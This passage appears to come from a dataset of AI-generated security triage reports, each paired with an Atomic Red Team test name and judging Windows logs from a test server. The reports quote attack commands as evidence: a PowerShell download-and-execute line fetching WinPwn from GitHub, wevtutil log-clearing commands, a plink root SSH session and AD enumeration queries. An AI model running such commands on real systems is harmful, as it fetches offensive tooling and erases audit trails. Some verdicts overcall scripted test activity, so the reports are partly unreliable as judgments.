5. **Event 1102 in Security Log**: Indicates that auditing logs were cleared, which is a red flag for malicious intentions.

**Assessment**:
The combination of log-clearing actions, PowerShell activity querying Active Directory, and consistent execution of `wevtutil.exe` under a high integrity level highly suggests malicious behavior. Log-clearing particularly indicates an intention to erase traces after potentially malicious activities, which implies compromise of the host system.

**Resolution**: MALICIOUS

**Guidance**: 
- Immediate isolation of the host from the network to prevent further damage.
- Conduct a full security investigation to determine the extent of the compromise.
- Review and reset credentials for the ""admin_test"" account and other privileged accounts potentially compromised on the system.
- Ensure logging and monitoring tools are adjusted to detect and alert on similar activities in the future.
- Consider engaging digital forensic experts if sensitive data might have been at risk."
Enumerate all accounts (Domain),"Based on the analysis of the provided logs, significant observations indicate potential suspicious or malicious activity. Below is a detailed breakdown:

1. **Security Log:**
   - Event ID 1102, ""The audit log was cleared"" was recorded by user ""admin_test"". Clearing of event logs, especially without valid reasoning, is a common technique used by adversaries to cover tracks after exploiting a system.

2. **Sysmon Log:**
   - Multiple executions of `wevtutil.exe` with command-line arguments to clear various event logs (Security, System, and Application). `wevtutil.exe` is a legitimate utility for managing Windows event logs and clearing logs using it is a strong indicator of malicious activity aimed at removing traces.
   - Execution of `cmd.exe` to run commands like `net user /domain` and `net group /domain` suggests reconnaissance activity potentially looking for domain users and groups.
   - Frequent use of `conhost.exe` in association with suspicious commands like the use of whoami and hostname is standard in script execution environments, which might indicate script-driven activity characteristic of exploitation.

3. **System and Application Logs:**
   - Events associated with clearing the System and Windows PowerShell logs (Event ID 104) by ""admin_test"". This aligns with activity noted in the security log, further supporting evidence of log clearing.
   - Application log events related to legitimate software (e.g., Microsoft Security Software) updates with no abnormal behaviors detected. These logs are probably not directly related to the suspicious activities but are included for comprehensive review.

### Assessment:
The activities highlighted above strongly suggest malicious intent due to:
- Log clearing activities via administrative commands that can obscure user actions and hinder forensic investigations.
- Reconnaissance actions evident through domain queries.

### Conclusion:
**Resolution: MALICIOUS**

### Recommended Actions:
1. **Immediate Isolation:** Isolate the server (""Server002"") from the network to prevent further potential exfiltration or lateral movement by the attacker.
2. **Forensic Investigation:** Conduct a detailed forensic analysis to identify any additional compromise, data exfiltration, or deployed backdoors/malicious software.
3. **Review User Account Activities:** Investigate ""admin_test"" account usage, audit all administrative account activities, and ensure multi-factor authentication (MFA) is implemented.
4. **Change Credentials:** Reset passwords for potentially compromised accounts, especially those with administrative privileges.
5. **System Hardening:** Apply all necessary security patches and updates. Implement enhanced logging and monitoring to detect similar future activities.

This assessment should be communicated to relevant stakeholders, followed by action upon recommendations for securing the environment."
WinPwn - fruit,"The analysis of the provided Windows event logs reveals indications of potentially malicious activities on the investigated host ""Server002"". Below is a detailed examination of suspicious behaviors and indicators of compromise:

1. **PowerShell Activity**:
   - The Windows PowerShell logs show the execution of potentially malicious scripts. The logs contain `powershell.exe` command lines that utilize `iex(new-object net.webclient).downloadstring` to download and execute a script from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`. This method of script execution (`iex`) is commonly used in malicious activities to execute dynamic or remote content.
   - The specific script URL and the user input parameter `{$S3cur3Th1sSh1t_repo}` further raise suspicion, as they reference known offensive security tools.

2. **Sysmon Logs**:
   - Sysmon logs display the execution of `wevtutil.exe` clearing event logs (Application, System, Security, and Windows PowerShell), which is a known tactic of attackers to cover their tracks and make forensic analysis difficult. The high integrity level and the Administrator's username `admin_test` being used add to the suspicion.
   - Other processes are consistent with typical forensic maneuvers by attackers, such as using tools like `wevtutil.exe` for log manipulation.

3. **Security and System Logs**:
   - Event ID 1102 (Security) and 104 (System) indicate that logs have been cleared. The clearing of event logs is concerning, particularly when associated with `admin_test`, suggesting an attempt to remove traces of activity.
   - Multiple instances of Event ID 4672 indicate that the user `admin_test` has been granted high-privilege rights, which can be indicative of privilege escalation activities.

4. **Network Logon Activity**:
   - Logon activities (Event ID 4624) for the user `admin_test` through NTLM authentication and from an external workstation suggest potential lateral movement within the network.

**Assessment**:
- **MALICIOUS**: Based on the analysis of the PowerShell logs pointing towards the execution of potentially malicious scripts, Sysmon logs indicating log clearing activities using administrative privileges, and the nature of observed security logs, it is evident that the activities recorded in these logs are malicious. The combination of unauthorized PowerShell script execution and evidence of log manipulation points towards a definite security breach.

**Guidance on How to Proceed**:
1. **Immediate Containment**: Isolate the affected system (Server002) from the network to prevent further malicious activities and lateral movement across the network.
2. **Forensic Investigation**: Conduct a deeper forensic investigation into the origin and scope of the breach, including analyzing network traffic and other endpoints' logs to identify associated threats.
3. **Credential Audit**: Perform an audit of all user accounts, especially those with administrative privileges, to detect compromised accounts and enforce password changes and two-factor authentication.
4. **Review and Harden Security Policies**: Evaluate current security policies and monitoring strategies to enhance defenses, including better logging, blocking unwanted PowerShell script executions, and restricting high-risk administrative actions.
5. **Remediation and Recovery**: After a comprehensive investigation and risk assessment, begin the remediation of any discovered vulnerabilities, followed by a secure restoration from backups, while ensuring all systems are free from compromise."
System Owner-User Discovery Using Command Prompt,"Based on a careful analysis of the provided Windows event logs, here is the detailed assessment of the activity observed:

### Suspicious or Anomalous Behavior:

1. **Event Log Deletion:**
   - **System & Security Logs Cleared:** There are multiple entries showing system event logs being cleared (Event ID 104) in the system log and an entry (Event ID 1102) in the security log. This activity was performed by the user `admin_test`. Log clearing is often used by attackers to cover their tracks after gaining unauthorized access to a system.
   - **PowerShell Logs Cleared:** Windows PowerShell logs being cleared as well is noted, raising suspicions further as PowerShell is a common tool used for lateral movement and privilege escalation.

2. **Command-Line Usage:**
   - Entries show the use of `wevtutil` to clear logs (""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl...""). The use of system utilities to manipulate or clear event logs is a strong indicator of malicious intent.

3. **Process Execution:**
   - The logs recorded processes such as `cmd.exe`, `net.exe`, and the invocation of `whoami.exe`. 
   - A batch of commands executed via `cmd.exe` which gather user information and network data. This can indicate either a legitimate administrative action or potentially reconnaissance activity following unauthorized access.

4. **Credential Access Events:**
   - There are events (Event ID 5379) that show unsuccessful attempts to retrieve credentials. Although they returned errors, repeated access attempts are suspicious, especially if they target user accounts not typically accessed.

### Indicators of Malicious Activity or Compromise:

- The combination of log clearing (an attempt to erase traces of certain activities), command-line execution capturing user and system information, and attempts at accessing credentials strongly suggest malicious intent.
- The alignment across several logs—the use of `admin_test` for potentially unauthorized actions—also indicates a probable compromise of this user account or its misuse if legitimate.

### Conclusion and Resolution:

Considering the patterns identified, including log clearing activities, unusual command-line executions, and failed credential access attempts—these logs meet criteria for an assessment of **MALICIOUS** activity.

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Isolate the affected system to prevent further potential compromise.
   - Change the password for the `admin_test` account and review its usage history.
   - Conduct a full forensic analysis to determine the extent of the breach.

2. **Long-term Measures:**
   - Implement stricter access controls, monitoring, and alerting to detect similar activities in the future.
   - Ensure event logs are securely archived to protect them from unauthorized clearing.
   - Conduct security awareness training focusing on safeguarding administrative accounts.

List Open Egress Ports,"The provided logs indicate several activities on the Windows host, some of which are potentially suspicious. Here is the detailed analysis based on the logs:

### Analysis

1. **PowerShell Activity**:
   - Multiple instances of a PowerShell script are executing. The script attempts to connect to a host `allports.exposed` at various ports listed in a file located at `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1016\src\top-128.txt`. The results of these connections are stored in a file on the user's desktop.
   - The presence of the directory name `AtomicRedTeam` suggests simulated adversary techniques, which may indicate either legitimate security testing or unauthorized penetration testing attempts.

2. **Event Log Clearance**:
   - System logs indicate that the event logs for the System, Windows PowerShell, and Security channels were cleared by the user `admin_test`. This is suspicious as log clearing is often associated with attempts to cover tracks during unauthorized access or malicious activity.

3. **Sysmon Logs**:
   - Multiple occurrences of the `wevtutil.exe` command were used with the `cl` (clear log) argument, which aligns with the log clearance events observed in the system logs.
   - Frequent usage of tools such as `whoami.exe`, `hostname.exe`, and PowerShell could be indicative of information gathering, which is typical in unauthorized activity or penetration testing.

4. **User Context**:
   - Most activities are operated under the `admin_test` user account with high integrity levels, which implies administrative privileges.

### Conclusion

The combination of these observations points towards potentially unauthorized testing or malicious activity:

1. **Clearing Event Logs** is a strong indicator of malicious intent, as it is a common tactic to evade detection.
2. The execution of the PowerShell script targeting `allports.exposed` suggests scanning for open ports on a potentially malicious or test domain.

The activities suggest a potential compromise or unauthorized activity. Given these circumstances and the evidence of potentially nefarious behavior, the logs should be considered:

- **Resolution**: **MALICIOUS**

### Recommendations

- **Immediate Actions**: 
  - Investigate the `admin_test` account for any unauthorized access or changes.
  - Conduct a thorough malware and threat scan of the machine.
  - Review organizational policies to ensure that any use of security testing tools or scripts is authorized and supervised.

- **Further Steps**:
  - Increase monitoring of PowerShell script executions and implement logging policies that retain critical system events.
  - Consider deploying endpoint detection and response (EDR) systems to better detect and mitigate similar behaviors in the future. 

Given the severity of the actions observed, swift investigation and response are crucial to securing the environment."
ESXi - Darkside system information discovery,"Upon thorough analysis of the provided Windows event logs, a few indicators suggest potential malicious activities or at least activities that require further investigation:

1. **Clearing of Event Logs**:
   - **System Log Cleared**: The entry with `EventID: 104` in the System log indicates that the system event log was cleared by the user `admin_test`. This operation can be considered suspicious as it might be performed to cover up malicious activities.
   - **Windows PowerShell Log Cleared**: Similarly, `EventID: 104` indicates that the PowerShell log was cleared by the same user. A cleared PowerShell log is often a red flag, suggesting attempts to hide potentially harmful commands.
   - **Security Log Cleared**: The `EventID: 1102` in the Security log demonstrates log clearance, again potentially indicating attempts to clean up traces of malicious activities.

2. **Suspicious Use of `wevtutil`**:
   - Multiple instances of `wevtutil.exe` are seen in the Sysmon logs, specifically performing the command `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, and `cl Security`. These commands are used to clear specific event logs, reinforcing the concern raised by the cleared logs events.

3. **Use of Plink for Potential Unauthorized Access**:
   - The Sysmon log shows an execution of `plink.exe` being used to connect to `atomic.local` with SSH, using the root account, which could imply tunneling activity or data exfiltration. This is highly suspicious, especially given the use of power tools like Plink in potentially unauthorized contexts.

4. **Abnormal PowerShell Execution**:
   - The execution of `PowerShell.exe` by the `admin_test` user without any tied command can indicate possible attempts to run complex or harmful scripts that are stripped from the logs.

5. **Execution of Unexpected Tools**:
   - Processes like `whoami.exe` and `hostname.exe` are being executed, possibly to gather system information, which could be preparatory to further exploitation or lateral movement.

Given these indicators, the logs show activities that could be categorized as highly suspicious, and potentially malicious given the context of log clearance and the execution of risky commands and tools. This conclusion leads to the following resolution:

- **Resolution**: **SUSPICIOUS**

**Guidance on How to Proceed**:
- Conduct a full investigation on the actions of the user `admin_test`, as their account was involved in potentially covering tracks by clearing logs.
- Review account privileges and assess any unauthorized access or escalation permissions.
- Check network logs for any unusual outbound connections that may correlate with these activities, especially focusing on connections related to `plink.exe`.
- Perform a forensic examination on the host to identify any undetected malware or rootkits.
- Implement tighter security measures, such as monitoring critical account activities and enforcing stricter access controls and logging policies."
PowerShell Network Sniffing,"Upon thorough examination of the provided Windows event logs from a system identified as ""Server002,"" a careful analysis reveals the following observations:

### Key Observations:
1. **Event Log Clearing**:
   - There are multiple entries indicating the clearing of event logs by the user `SERVER002\admin_test`. Specifically:
     - Security log cleared at `2024-10-22 14:11:06` (EventID: 1102).
     - System log cleared at `2024-10-22 14:11:06`.
     - This action of clearing logs is often used by attackers to cover their tracks, especially if performed by non-routine SysAdmins or without documented maintenance.

2. **Suspicious PowerShell Activity**:
   - PowerShell scripts that appear to involve network packet capture are executed with the command `New-NetEventSession -Name Capture007`. This command is often associated with network monitoring, which could be benign if performed by network administrators but suspicious otherwise.
   - The execution of this PowerShell session did not raise other alerts, yet its presence combined with log clearing is a red flag.

3. **Privilege Escalation**:
   - `admin_test` has been granted high privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., as shown in EventID 4672. While these can be standard for an admin account, it strengthens concern when viewed alongside log clearance.

4. **Time Manipulation**:
   - System time adjustments are logged which could indicate attempts to manipulate or mislead log timestamps.

### Assessment:
The combination of these events strongly suggests malicious intent rather than administrative maintenance:
- **Clearing of event logs** combined with PowerShell network activities are strong indicators of potential compromise or policy violations.
- High-privilege process executions with questionable network-related PowerShell commands.
- Time adjustments, which could point to attempts at log obfuscation.

### Resolution:
- **Resolution: MALICIOUS**
  - The logs indicate activities consistent with post-exploitation techniques such as log clearing and network monitoring through PowerShell. This suggests unauthorized access or insider threats aiming to remove traces and possibly exfiltrate data.

1. **Immediate Containment**:
   - Revoke current sessions and change all credentials for the `admin_test` account.
   - Conduct a thorough audit of privileges and recent activities for this and possibly related accounts.

2. **Forensic Analysis**:
   - Retrieve and analyze full logs, memory images, and disk snapshots for potentially removed or altered artifacts.
   - Identify all systems accessed by `admin_test` and evaluate them for similar activities.

3. **Security Measures Enhancement**:
   - Implement stricter controls around PowerShell execution policies and log maintenance.
   - Increase monitoring for high-value actions, such as privilege escalation and log clearance.
  
These steps are essential in mitigating the detected malicious activity and preventing further unauthorized access."
Find and Display Internet Explorer Browser Version,"Upon analyzing the provided Sysmon, System, and Security logs, the following findings stand out as potentially suspicious behavior:

### Suspicious or Anomalous Behavior:
1. **Event Log Clearing:**
   - Multiple instances of the `wevtutil.exe` process are used to clear different event logs (Security, System, Windows PowerShell). 
   - Logs cleared by `admin_test` suggest an attempt to cover tracks, a common technique seen in malicious activity.
   - Sysmon Event ID 5 correlates with the clear events, showing `wevtutil.exe` being executed under high integrity level by `admin_test`.

2. **Processes and Command Lines:**
   - The commands executed: 
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl Application`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl System`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl ""Windows PowerShell""`
   - Use of `cmd.exe` and `reg.exe` to query Windows registry keys related to Internet Explorer, typically not related to regular activities done by administrators.

3. **User Account and Parent Process:**
   - All the events are associated with the `SERVER002\\admin_test` account which further raises a red flag since the clearing logs indicates the same account.
   - Processes like `wevtutil.exe` and `cmd.exe` frequently spawned from high-integrity processes like `wsmprovhost.exe`, which can suggest potential misuse of administrative privileges.

4. **Time Discrepancy:**
   - Time changes noted in the System and Security logs (Event ID 4616 and 1 from Kernel-General) suggest that timestamps may have been altered. This might aim to conceal logs through time manipulation.

### Assessment:
These logs contain multiple signs of potentially malicious activity such as event log clearing, usage of powerful command-line utilities (like `wevtutil.exe`) to delete logs, and registry queries. These characteristics are common in scenarios where an attacker tries to maintain persistence or hide their activities after gaining unauthorized access. 

### Resolution:
- **Resolution:** MALICIOUS

### Guidance:
1. **Immediate Actions:**
   - Isolate the machine (`Server002`) from the network to prevent further actions from the attacker.
   - Conduct a thorough examination of the `admin_test` user account. Review recent activities and consider resetting or disabling the account if unauthorized access is confirmed.

System Time with Windows time Command,"### Detailed Analysis

#### Overview:
The provided logs encompass security, system, and application events, along with detailed logs from Sysmon, showcasing operations on a Windows server. A review of these logs highlights potential security concerns, particularly focused around log file clearing and privilege escalation activities.

#### Key Findings:

1. **Log File Clearing (EventID 1102 & 104):**
   - The events related to log file clearing in both the Security and System channels stand out as potentially suspicious. Specifically, these actions are timestamped closely together.
   - `wevtutil.exe` was used to clear event logs, as seen in both Sysmon and Security logs. The use of `wevtutil.exe` to clear logs usually indicates an attempt to cover tracks after potentially malicious activity.
   - The user `admin_test` executed these commands, indicating the involvement of an administrative account. Such actions without a valid explanation are highly suspicious.

2. **Privilege Escalation Attempts (EventID 4672):**
   - A privilege escalation was observed with the user `admin_test` acquiring numerous high-level privileges, such as `SeDebugPrivilege`, often used in malicious activities to gain detailed system information or bypass system controls.
   
3. **Unusual Process Execution:**
   - Multiple instances of the `wevtutil.exe` process were observed executing commands to clear the event logs. This was done repetitively and through different sessions as recorded in the Sysmon logs.
   - There are several executions of processes such as `whoami.exe` and `cmd.exe`. While these might be benign in isolation, in conjunction with log clearing, they raise suspicion.
   
4. **Time Manipulation (EventID 4616):**
   - There were events logged showing time changes by `svchost.exe`. Time modification, if unauthorized, could potentially be used to confuse time-based security controls or logs.

5. **NTLM Logon (EventID 4624):**
   - NTLM authentication was noted, which, although normal in some environments, could be seen as less secure, especially if attackers were abusing it to maintain access. However, there were no clear events directly correlating this to an active breach.

#### Assessment:

After a thorough review of the logs, a pattern emerges that suggests suspicious behavior, but without explicit malicious payloads or confirmed breaches. Particularly, the log clearing and privilege escalation via an admin account point toward potentially unethical actions possibly linked to an internal threat or misconfigured application.

**Threat or Risk Identified:**
- There is a significant risk of data tampering and unauthorized changes being made without leaving traceable logs due to the clearing of event logs.
- The combination of admin account usage, high-level privileges, and log clearing suggests the potential for malicious intent.

**Resolution:**
- **SUSPICIOUS**: The activity observed is unconventional and aligns with techniques used to cover the tracks of malicious behaviors. Further investigation is essential, particularly around the context and necessity of these actions by `admin_test`.

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - **Review Admin Actions**: Verify the legitimacy of actions performed by the `admin_test` account. Investigate whether this account should have such privileges and access.
   - **Preserve Logs**: Ensure remaining logs are secured and take steps to prevent further log tampering.
   - **Monitor Account Activity**: Increase monitoring on the `admin_test` account and any other accounts displaying similar behaviors.
   
2. **Further Investigation:**
   - Conduct an audit of recent changes and activities within the system that may not be accounted for due to log clearance.
   - Cross-reference any other logs or monitoring tools in use (e.g., network traffic logs) for anomalies correlating to these events.

3. **Preventive Measures:**
   - Implement stricter access controls and justifiable usage policies for high-privileged accounts.
   - Educate users on security practices, focusing on the implications of unauthorized log file manipulation and privilege escalations.

These steps will help ascertain if there is ongoing intruder activity and mitigate potential risks."
Network Share Discovery via dir command,"Based on the analysis of the provided event logs from a Windows host, there are several findings that stand out and require attention:

### Suspicious or Anomalous Activities:
1. **Event Log Clearing:**
   - The System logs indicate two events (EventID 104) with the message ""LogFileCleared"" from the channels ""System"" and ""Windows PowerShell"" logs by the user ""admin_test.""
   - Similarly, the Security log shows an event (EventID 1102) indicating the security logs being cleared by the same user.
   - Clearing logs is a typical behavior for an attacker attempting to cover tracks after malicious activities.

2. **Use of `wevtutil.exe`:**
   - There are multiple instances of `wevtutil.exe` being run under the context of the user ""admin_test"" with high integrity. This tool is typically used to manage event logs and can be used to manipulate or clear logs.
   - The frequency and manner in which `wevtutil.exe` was used suggest efforts to clear event logs, consistent with the log file-clearing events noted above.

3. **Suspicious Command Execution:**
   - The execution of `cmd.exe` under ""admin_test"" with command-line arguments involving directory enumeration on administrative shares (e.g., `dir \\127.0.0.1\c$`, `dir \\127.0.0.1\admin$`, and `dir \\127.0.0.1\IPC$`) is worth noting. Such actions could denote reconnaissance or lateral movement attempts to gather information on accessible shares.

4. **Multiple Instances of `whoami.exe`:**
   - There are several calls to `whoami.exe` by ""admin_test,"" a tool which displays the current user information. Frequent usage may indicate attempts by the user or a script to verify user privileges, possibly part of a privilege escalation workflow.

### Assessment:
- The logs suggest potential malicious activity. The act of clearing system, security, and PowerShell logs, combined with unusual command executions like directory enumeration on administrative shares, points to an attempt to obfuscate or hide actions performed on the host.
- The use of `wevtutil.exe` with elevated privileges to clear logs is particularly indicative of someone trying to cover their tracks.

### Conclusion:
The activity within the logs strongly suggests **malicious intent**. The following actions are recommended:

1. **Immediate Incident Response:**
   - Isolate the affected host (Server002) from the network to prevent further potential compromises.
2. **Forensic Analysis:**
   - Conduct a comprehensive forensic analysis to determine the extent of the compromise. This includes data recovery, timeline reconstruction, and examination of all available system artifacts.
3. **Review Access Credentials:**
   - Investigate the credentials used (""admin_test"") to ascertain how they may have been compromised and change credentials across impacted systems immediately.
4. **Audit Other Systems:**
   - Check other systems for similar indicators of compromise (IoCs) to ensure this is not a widespread attack across the network.
5. **Strengthen Security Posture:**
   - Implement enhanced monitoring and alerting for suspicious activities, particularly those involving log manipulation and administrative actions.

### Conclusion for Resolution:
- **MALICIOUS**: The logs indicate clear malicious activity designed to cover tracks and possibly perform reconnaissance or further nefarious actions. Immediate response and investigation are warranted to limit damage and remediate the security threat."
WinPwn - shareenumeration,"After analyzing the provided event logs, it is clear that there are multiple indicators of potentially malicious activity, as outlined below:

### Suspicious and Anomalous Behavior:
1. **Log File Clearing:**
   - Privileged user `admin_test` cleared the event logs across multiple channels, including System, Windows PowerShell, and Security logs (Events 104 and 1102). Log file clearing is a common tactic to hide traces of malicious actions.

2. **Suspicious PowerShell Activity:**
   - A PowerShell script was executed using a web client to download and execute another script from a GitHub repository (Event 600 in Windows PowerShell log). The use of `iex(new-object net.webclient).downloadstring(...)` is often associated with malicious activities as it allows execution of external scripts.

3. **Unauthorized File Operations:**
   - A process executed `whoami.exe` and other common administrative tools such as `wevtutil.exe` to manage event logs. Actions such as `wevtutil.exe cl` to clear event logs (Sysmon Events 1 and 5) indicate an attempt to cover tracks.

### Malicious Activity Indications:
- The combination of cleared logs and downloading and execution of scripts from an external repository, coupled with the clearing of logs, strongly suggests the presence of malicious activity.
- The execution of unauthorized PowerShell scripts intended to enumerate shares through an external script (WinPwn) is particularly concerning, as it constitutes a phase in lateral movement or privilege escalation attacks.

### Assessment and Guidance:
- **Assessment:** MALICIOUS - The activities described in the logs, including the clearing of event logs and execution of potentially malicious scripts, are classic signs of an ongoing cyber attack, possibly aimed at reconnaissance or lateral movement within the network.
  
- **Recommendations for Proceeding:**
  - **Immediate Response:** Isolate the affected machine (`Server002`) from the network to prevent further actions by the attacker(s).
  - **Further Investigation:** Conduct a full forensic investigation to determine the extent of the compromise, including examining other systems that `admin_test` may have accessed.
  - **Review and Audit:** Audit user accounts and privileges, especially for `admin_test` and any other users with elevated privileges, to determine if any unauthorized changes have been made.
  - **Strengthen Network Security:** Implement enhanced monitoring for unusual activity and review security policies to prevent unauthorized execution of scripts like the one observed.
  - **Patch Vulnerabilities:** Ensure all systems are up to date with the latest security patches, particularly focusing on PowerShell execution policies and network segmentations.

The logs clearly indicate malicious behavior that should be addressed urgently to mitigate further impact on the system and network."
Enumerate Users Not Requiring Pre Auth (ASRepRoast),"### Analysis of Windows Event Logs

#### Identification of Suspicious Activities

1. **Clearing of Logs**: There are multiple instances where logs were cleared:
   - **Security Log Clearance** at ""2024-10-23 13:21:40.0487040"" by user ""admin_test"".
   - **System Log Clearance** at ""2024-10-23 13:21:39.8670989"" and ""2024-10-23 13:21:40.2839189"".

   Log clearance by administrative users can potentially signify an attempt to cover tracks after unauthorized or malicious activities.

2. **PowerShell Activity**: 
   - Execution of PowerShell with the command `get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}`. This command is used to query Active Directory for users whose accounts do not require pre-authentication, potentially indicating an enumeration attempt to identify accounts vulnerable to specific Kerberos attacks like AS-REP Roasting.

3. **Use of `wevtutil`**:
   - Multiple instances of `wevtutil.exe` being executed to clear different log channels such as Microsoft-Windows-Sysmon, Application, System, and Security. This action is usually associated with attempts to delete tracks after unauthorized actions have been taken.

4. **Processes with High Integrity Level**:
   - Processes like `wevtutil.exe`, `powershell.exe` under high integrity level could indicate it has administrative level access during their execution, making it suspicious without proper context.

#### Security Implications

The clearing of event logs combined with the execution of potentially suspicious PowerShell commands indicates a heightened risk of malicious activity. The sequence of events appears to show an advanced attempt at obfuscation and data collection activities, potentially targeting Active Directory weaknesses. This behavior is indicative of potential lateral movement or an IAM (Identity and Access Management) attack.

### Conclusion

Based on the activities identified regarding the clearing of logs and suspicious use of PowerShell, combined with the `wevtutil` history in the logs, the activity can be considered **MALICIOUS**. The actions observed are textbook examples of obfuscation and reconnaissance tactics often employed by advanced threat actors or insiders with malicious intent.

### Recommendations

1. **Immediate Threat Containment**: Isolate the affected host `Server002` from the network to prevent further unauthorized activities or communication with potential command and control servers.
   
2. **Forensic Analysis**: Conduct a comprehensive forensic analysis of `Server002` to identify and preserve evidence regarding the source and extent of the compromise.

3. **User Credential Review**: Review and reset credentials for the user ""admin_test"" and any other potentially impacted accounts. Investigate additional potential risk exposure in Active Directory.

4. **Log Monitoring Enhancement**: 
   - Enhance monitoring and alerting around log clearance and PowerShell execution activities.
   - Implement advanced threat detection techniques for command-line auditing and PowerShell script logging.

5. **Security Training**: Reinforce user training and awareness about phishing attacks, credential misuse, and the importance of maintaining secure practices in using administrative access."
List Internet Explorer Bookmarks using the command prompt,"### Detailed Analysis:

Upon review of the provided Windows event logs from a host named ""Server002,"" there are several indicators that suggest suspicious activity. Here's the detailed analysis:

1. **Event Logs and Privilege Escalation:**
   - **Event Clearing:** The logs indicate that multiple event logs, specifically the System, Security, and Windows PowerShell logs, were cleared almost simultaneously by a user named ""admin_test."" This is reflected in the events with IDs 104 and 1102 in the System and Security logs, respectively. Clearing of logs can often be an indicator of malicious activity as attackers may attempt to cover their traces by clearing logs.
   
2. **PowerShell Usage:**
   - **Absence of PowerShell Logs:** Although there is no provided PowerShell log, the clearing of the Windows PowerShell channel log is recorded, which could suggest an attempt to hide potentially malicious script execution. 

3. **Process Execution Analysis:**
   - **Execution of `wevtutil` Utility:** The Sysmon logs show multiple executions of ""wevtutil.exe"" with the `cl` (clear log) argument across different channels (System, Application, Security, Windows PowerShell), initiated by ""SERVER002\admin_test."" This is a strong indication of deliberate log clearing.
   - **Competence Level:** All activities executed with a high integrity level, indicating administrative privileges likely utilized.

4. **CMD Usage:**
   - **Suspicious Command Usage:** An instance of ""cmd.exe"" was observed running with a command to list all directories under the user profile's Favorites (`cmd.exe /c dir /s /b %USERPROFILE%\Favorites`). This activity, while potentially benign in certain contexts, could be indicative of reconnaissance within the environment to locate specific files or data of interest to an attacker.

5. **Time Synchronization Events:**
   - **Events Detected:** There are Kernel-General and Time-Service events concerning time changes and synchronization with `time.windows.com`, which appear ordinary but sometimes are seen during or following compromise activities to hide attacker actions.

6. **Microsoft Edge Update Activity:**
   - **Numerous Edge Processes:** There are extensive logs related to the Microsoft Edge Update service. This is generally expected behavior, considering routine software updates. However, these appear unrelated to the primary concerns elsewhere in the logs.

### Assessment:

Given the evidence of log clearing attempts (which by themselves are a notable malicious indicator) coupled with the abnormal CMD and PowerShell activity patterns, there is substantial ground for considering this as suspicious activity.

### Recommended Resolution:
- **SUSPICIOUS** - The activity recorded in the logs exhibits clear signs of logging manipulation and potentially unauthorized administrative actions, suggesting that further investigation is warranted to determine the scope and impact of these actions. Immediate steps should include reviewing user roles and permissions, analyzing network traffic for anomalies, and checking for any other artifacts of compromise on the host. 

### Guidance on Next Steps:
1. **Isolate the Host:** Consider isolating the host from non-essential network activity until a thorough forensic analysis can be conducted.
2. **Conduct a Comprehensive Investigation:** Engage in a deeper forensic investigation focusing on timeline analysis, correlating potential malicious activities, and calculating the impact.
3. **Audit User Activities:** Validate the necessity and legitimacy of the admin_test activities. Check logs for source IPs or devices used by this account around the timeline of suspicious activities.
4. **Review Security Configurations:** Ensure security policies are stringent and apply least privilege principles to prevent unnecessary administrative actions.
5. **Alert Security Team:** Immediately inform the security operations team to monitor for similar behaviors across the organization to mitigate risk."
TruffleSnout - Listing AD Infrastructure,"After analyzing the provided log entries, the following points stand out and suggest suspicious activity:

1. **Event Log Clearing**: The Security event log contains Event ID 1102, which indicates that the event logs on the system were cleared. Log clearing can be a sign of malicious activity as it is often used by attackers to cover their tracks. This action was performed by the user `SERVER002\admin_test`.
   
2. **Use of Wevtutil**: The logs indicate multiple instances where the `wevtutil.exe` command was used to clear specific logs, including the Security, Application, and System logs. The use of `wevtutil.exe` for clearing logs (as seen in the command line inputs like `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`) is highly indicative of an attempt to erase evidence from the system.

3. **Presence of Unusual or Suspicious Commands**: There is a log entry showing the execution of `cmd.exe` with a command line that includes the execution of `TruffleSnout.exe` from a potentially suspicious directory path (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\`). `TruffleSnout.exe` is a third-party executable, and its execution in this context, especially after log clearance activities, is suspicious. 

4. **High Integrity Level for Executed Processes**: The processes executed under the user `SERVER002\admin_test` often run with a high integrity level, indicating administrative privileges, which could be leveraged for malicious purposes.

Given these observations, the conclusion from the log entries indicates:
- **Indicators of Malicious Activity**: The combination of log clearing events, suspicious use of `wevtutil.exe`, and execution of potentially malicious executables all suggest an intentional attempt to conduct unauthorized or harmful actions on the system.

### Resolution: MALICIOUS
The activities logged represent a likely malicious compromise. Immediate action should be taken to contain any potential threat:

- **Immediate Incident Response**: Initiate an incident response procedure to investigate the breach further and contain any ongoing malicious activities.
- **User Account Review**: Review the actions and privileges of the user `admin_test`. It's important to check for signs of account compromise.
- **System Isolation**: Consider isolating the affected system (Server002) from the network to prevent further spreading of potential threats.
- **Restoration and Recovery**: Assess the need to restore the system to a known good state if compromise is confirmed.
- **Enhanced Monitoring**: Implement enhanced monitoring for this and other systems to detect further suspicious activities promptly.

Further forensic analysis might be necessary to understand the full scope of the compromise and to ensure the security of the environment moving forward."
Query Registry with Powershell cmdlets,"Upon analyzing the provided event logs, several points of interest and potential anomalies have been noted:

1. **Registry Queries via PowerShell**: The PowerShell logs indicate a set of registry queries using `Get-Item` and `Get-ChildItem` on numerous startup and run keys. While this activity might be part of legitimate system audits or administrative scripts, it is also characteristic of reconnaissance actions by malicious actors attempting to find persistence mechanisms or sensitive configurations.

2. **Event Log Clearing**: The logs show that several event logs (System, Windows PowerShell, and Security) were cleared by the user `SERVER002\admin_test`. Clearing event logs can be a tactic used by attackers to cover their tracks, especially during or after an intrusion.

3. **Running Processes and Privileges**: 
   - Processes such as `whoami.exe`, `hostname.exe`, and other command utilities like `wevtutil.exe`, and `findstr.exe` executed under the user `SERVER002\admin_test` with high-integrity levels. These might be used for reconnaissance or system information gathering.
